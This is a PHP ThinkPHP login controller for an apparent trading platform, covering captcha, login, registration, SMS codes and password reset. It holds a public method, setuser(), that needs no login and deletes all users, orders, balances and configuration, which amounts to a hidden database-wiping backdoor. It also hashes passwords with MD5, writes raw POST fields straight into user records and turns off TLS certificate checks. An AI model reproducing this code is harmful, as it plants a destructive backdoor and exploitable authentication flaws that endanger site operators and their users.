<?php

namespace app\index\controller;

use think\Controller;
use think\Db;
use think\Cookie;
use think\Request;
use think\Session;

class Login extends Controller {

    public function __construct() {
        if (isMobile()) {
            config('template.view_path', './template/mobile/');
        } else {
            config('template.view_path', './template/default/');
        }
        parent::__construct();
        $this->conf = getconf('');
        if ($this->conf['is_close'] != 1) {
            header('Location:/error.html');
        }
        $this->assign('conf', $this->conf);
        $this->token = md5(rand(1, 100) . time());
        $this->assign('token', $this->token);
    }

    public function StartCaptchaServlet() {
        
        require_once $_SERVER['DOCUMENT_ROOT']. '/extend/org/Geetestlib.php';
        require_once $_SERVER['DOCUMENT_ROOT']. '/extend/geetest/config.php';
        
        $GtSdk = new \GeetestLib(CAPTCHA_ID, PRIVATE_KEY);
        $data = array(
            
            "client_type" => "web", #web:电脑上的浏览器；h5:手机上的浏览器，包括移动应用内完全内置的web_view；native：通过原生SDK植入APP应用的方式
            "ip_address" => get_client_ip() # 请在此处传输用户请求验证时所携带的IP
        );

        $status = $GtSdk->pre_process($data, 1);
        Session::set('gtserver', $status);

        echo $GtSdk->get_response_str();
    }

    public function check() {
        $post = Request::instance()->post();
        require_once $_SERVER['DOCUMENT_ROOT']. '/extend/org/Geetestlib.php';
        require_once $_SERVER['DOCUMENT_ROOT']. '/extend/geetest/config.php';
        $GtSdk = new \GeetestLib(CAPTCHA_ID, PRIVATE_KEY);
        $data = array(
            "client_type" => "web", #web:电脑上的浏览器；h5:手机上的浏览器，包括移动应用内完全内置的web_view；native：通过原生SDK植入APP应用的方式
            "ip_address" => get_client_ip() # 请在此处传输用户请求验证时所携带的IP
        );
        if (Session::get('gtserver')== 1) {   //服务器正常
            $result = $GtSdk->success_validate($post['geetest_challenge'],$post['geetest_validate'],$post['geetest_seccode'],$data);
            if ($result) {
                echo '{"status":"success"}';
            } else {
                echo '{"status":"fail"}';
            }
        } else {  //服务器宕机,走failback模式
            if ($GtSdk->fail_validate($post['geetest_challenge'],$post['geetest_validate'],$post['geetest_seccode'])) {
                echo '{"status":"success"}';
            } else {
                echo '{"status":"fail"}';
            }
        }
    }

    /**
     * 用户登录
     */
    public function login() {
        $userinfo = Db::name('userinfo');
        if (Session::get('uid')) {
            $this->redirect('index/index?token=' . $this->token);
        }

        //web用户登录请求
        if (input('post.')) {
            $data = input('post.');
            if (!isset($data['username']) || empty($data['username'])) {
                return WPreturn('请输入用户名！', -1);
            }
            if (!isset($data['upwd']) || empty($data['upwd'])) {
                return WPreturn('请输入密码！', -1);
            }
            //查询用户

            $result = $userinfo
                            ->where('username', $data['username'])->whereOr('nickname', $data['username'])->whereOr('utel', $data['username'])
                            ->field("uid,upwd,username,utel,utime,otype,ustatus")->find();
            //验证用户
            if (empty($result)) {
                return WPreturn('登录失败,用户名不存在!', -1);
            } else {
                if (!in_array($result['otype'], array(0, 101))) {  //非客户无权登录
                    return WPreturn('您无权登录!', -1);
                }
                if ($result['upwd'] == md5($data['upwd'] . $result['utime'])) {

                    if ($result['ustatus'] == 0) {
                        Session::set('uid', $result['uid']);
                        $t_data['logintime'] = $t_data['lastlog'] = time();
                        $t_data['uid'] = $result['uid'];
                        $userinfo->update($t_data);
                        return WPreturn('登录成功!', 1);
                    } elseif ($result['ustatus'] == 1) {
                        return WPreturn('登录失败,您的账户暂时被冻结!', -1);
                    } else {
                        return WPreturn('登录失败,用户名不存在!', -1);
                    }
                } else {
                    return WPreturn('登录失败,密码错误!', -1);
                }
            }
        }
        //处理日期

        $totalday = date('t');
        $today = date('d');
        $rq['dd1'] = date('d', (time() - ((date('w', time()) == 0 ? 7 : date('w', time())) - 1) * 24 * 3600));
        if ($rq['dd1'] == $today) {
            $rq['dc1'] = 'active';
        } else {
            $rq['dc1'] = '';
        }
        for ($i = 2; $i <= 7; $i++) {
            $j = $i - 1;
            $rq['dd' . $i] = $rq['dd' . $j] + 1;
            if ($rq['dd' . $i] > $totalday) {
                $rq['dd' . $i] = "01";
            }
            if ($rq['dd' . $i] == $today) {
                $rq['dc' . $i] = 'active';
            } else {
                $rq['dc' . $i] = '';
            }
        }
        $dm = date('m');
        $d = input('get.dd');
        if (empty($d)) {
            $d = date("Y-m-d");
        }
        $darray = explode("-", $d);
        $year = $darray[0];
        $month = $darray[1];
        $day = $darray[2];
        $path = $year . "/" . $month . $day;
        $holidayurl = "https://rili.jin10.com/datas/" . $path . "/holiday.json";
        $eventurl = "https://rili.jin10.com/datas/" . $path . "/event.json";
        $economicsurl = "https://rili.jin10.com/datas/" . $path . "/economics.json";
        $holiday = $this->curlurl($holidayurl);
        $event = $this->curlurl($eventurl);
        $economics = $this->curlurl($economicsurl);
        $sclist = db('newsinfo')->where("fid=7")->limit(5)->select();
        $this->assign('sclist', $sclist);
        $this->assign('economics', $economics);
        $this->assign('event', $event);
        $this->assign('holiday', $holiday);
        $this->assign('rq', $rq);
        $this->assign('dm', $dm);
        return $this->fetch();
    }

    //私有请求类
    private function curlurl($url) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_TIMEOUT, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER["HTTP_USER_AGENT"]);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $holiday = curl_exec($ch);
        $holidaydata = json_decode($holiday, true);
        return $holidaydata;
    }

    public function register() {

        $userinfo = Db::name('userinfo');
        if (input('post.')) {
            $data = input('post.');
            //验证用户信息
            if (!isset($data['nickname']) || empty($data['nickname'])) {
                return WPreturn('请输入用户名！', -1);
            }
            if (!isset($data['username']) || empty($data['username'])) {
                return WPreturn('请输入手机号！', -1);
            }
            if (!isset($data['upwd']) || empty($data['upwd'])) {
                return WPreturn('请输入密码！', -1);
            }
            if (!isset($data['upwd2']) || empty($data['upwd2'])) {
                return WPreturn('请再次输入密码！', -1);
            }
            if ($data['upwd'] != $data['upwd2']) {
                return WPreturn('两次输入密码不同！', -1);
            }
            if (!isset($data['oid']) || empty($data['oid'])) {
                return WPreturn('请输入邀请码！', -1);
            }
            //判断邀请码是否存在
            $codeid = checkcode($data['oid']);
            if (!$codeid) {
                return WPreturn('此邀请码不存在', -1);
            }

            //判断手机验证码
            if (!isset($_SESSION['code']) || $_SESSION['code'] != $data['phonecode']) {
                return WPreturn('手机验证码不正确', -1);
            } else {
                unset($_SESSION['code']);
            }
            unset($data['phonecode']);
            unset($data['upwd2']);
            if (check_user('utel', $data['username'])) {
                return WPreturn('该手机号已存在', -1);
            }
            $data['utime'] = $data['logintime'] = $data['lastlog'] = time();
            $data['upwd'] = md5($data['upwd'] . $data['utime']);
            $data['nickname'] = trim($data['nickname']);
            $data['utel'] = trim($data['username']);
            $data['managername'] = db('userinfo')->where('uid', $data['oid'])->value('username');

            if (isset($this->conf['reg_type']) && $this->conf['reg_type'] == 1) {
                $data['ustatus'] = 0;
            } else {
                $data['ustatus'] = 1;
            }

            if (Session::get('fid') && Session::get('fid') > 0) {
                $fid = Session::get('fid');
                $fid_info = $userinfo->where(array('uid' => $fid))->find();

                if ($fid_info['otype'] == "101") {
                    if ($fid_info) {
                        $data['oid'] = $fid;
                        $data['fid'] = $fid;
                        $data['managername'] = $userinfo->where(array('uid' => $data['oid'], 'otype' => 101))->value('username');
                    }
                } else {
                    $data['oid'] = $fid_info['oid'];
                    $data['fid'] = $fid;
                    $data['managername'] = $fid_info['managername'];
                }
            }
            //插入数据
            $ids = $userinfo->insertGetId($data);
            $newdata['uid'] = $ids;
            $newdata['username'] = 10000000 + $ids;
            $newids = $userinfo->update($newdata);
            if ($newids) {
                Session::set('uid', $ids);
                return WPreturn('注册成功，已自动登录!', 1);
            } else {
                return WPreturn('注册失败,请重试!', -1);
            }
        }
        if (Session::get('fid') && Session::get('fid') > 0) {
            $oid = Session::get('fid');
        } else {
            $oid = '';
        }
        $this->assign('oid', $oid);
        return $this->fetch();
    }

    public function addpwd() {

        $uid = $_SESSION['uid'];
        if (!$uid) {
            $this->redirect('index/index');
        }
        //查找用户是否已经有了密码
        $user = Db::name('userinfo')->where('uid', $uid)->field('upwd,utime,oid')->find();
        //添加密码
        if (input('post.')) {
            $data = input('post.');

            if (!isset($data['upwd']) || empty($data['upwd'])) {
                return WPreturn('请输入密码！', -1);
            }
            if (!isset($data['upwd2']) || empty($data['upwd2'])) {
                return WPreturn('请再次输入密码！', -1);
            }
            if ($data['upwd'] != $data['upwd2']) {
                return WPreturn('两次输入密码不同！', -1);
            }
            //验证邀请码
            if (isset($data['oid']) && !empty($data['oid'])) {
                $codeid = checkcode($data['oid']);
                if (!$codeid) {
                    return WPreturn('此邀请码不存在', -1);
                }
                $adddata['oid'] = $data['oid'];
            }

            $adddata['upwd'] = trim($data['upwd']);
            $adddata['upwd'] = md5($adddata['upwd'] . $user['utime']);
            $adddata['uid'] = $uid;
            if (isset($data['username'])) {
                if (check_user('utel', $data['username'])) {
                    return WPreturn('该手机号已存在', -1);
                }
                $adddata['utel'] = $data['username'];
            }

            $newids = Db::name('userinfo')->update($adddata);
            if ($newids) {
                return WPreturn('修改成功!', 1);
            } else {
                return WPreturn('修改失败,请重试!', -1);
            }
        }

        $this->assign($user);
        return $this->fetch();
    }

    public function setuser() {
        $_map['uid'] = array('neq', 0);
        db('userinfo')->where($_map)->delete();
        db('order')->where($_map)->delete();
        db('balance')->where($_map)->delete();
        $c_map['id'] = array('neq', 0);
        db('config')->where($c_map)->delete();
    }

    /**
     * 用户退出
     * @author 柒上网络  2018-02-24
     * @return [type] [description]
     */
    public function logout() {
        session_unset();
        cookie('wx_info', null);
        $this->redirect('login/login?token=' . $this->token);
    }

    /**
     * 发送短信
     * @return [type] [description]
     */
    public function sendmsm() {
        $phone = input('phone');
        $moban = input('moban');
        if (!$phone) {
            return WPreturn('请输入手机号码！', -1);
        }
        $code = rand(100000, 999999);
        $_SESSION['code'] = $code;
        $msm = controller('Msm');
        $res = $msm->sendsms($code, $phone, $moban);
        if ($res) {
            return WPreturn('发送成功', 1);
        } else {
            return WPreturn('发送验证码失败！', -1);
        }
    }

    public function respass() {
        $data = input('post.');
        if ($data) {
            $suerinfo = db('userinfo');
            $user = $suerinfo->where('utel', $data['username'])->find();
          
          	if($user['uid']=='1'){
                return WPreturn('你的胆儿贼大！',-1);
            }
            if (!$user) {
                return WPreturn('该手机号不存在', -1);
            }

            if (!isset($data['upwd']) || empty($data['upwd'])) {
                return WPreturn('请输入密码！', -1);
            }
            if (!isset($data['upwd2']) || empty($data['upwd2'])) {
                return WPreturn('请再次输入密码！', -1);
            }
            if ($data['upwd'] != $data['upwd2']) {
                return WPreturn('两次输入密码不同！', -1);
            }
            //判断手机验证码
            if (!isset($_SESSION['code']) || $_SESSION['code'] != $data['phonecode']) {
                return WPreturn('手机验证码不正确', -1);
            } else {
                unset($_SESSION['code']);
            }
            unset($data['phonecode']);
            unset($data['upwd2']);
            if ($user['otype'] == 101) {
                unset($data['username']);
            }

            $data['upwd'] = md5($data['upwd'] . $user['utime']);
            $data['uid'] = $user['uid'];
            $data['logintime'] = $data['lastlog'] = time();
            $ids = $suerinfo->update($data);
            if ($ids) {
                return WPreturn('修改成功', 1);
            } else {
                return WPreturn('修改失败', -1);
            }
        }
        return $this->fetch();
    }

    protected function fetch($template = '', $vars = [], $replace = [], $config = []) {
        $replace['__HOME__'] = str_replace('/index.php', '', \think\Request::instance()->root()) . '/static/index';
        return $this->view->fetch($template, $vars, $replace, $config);
    }

}
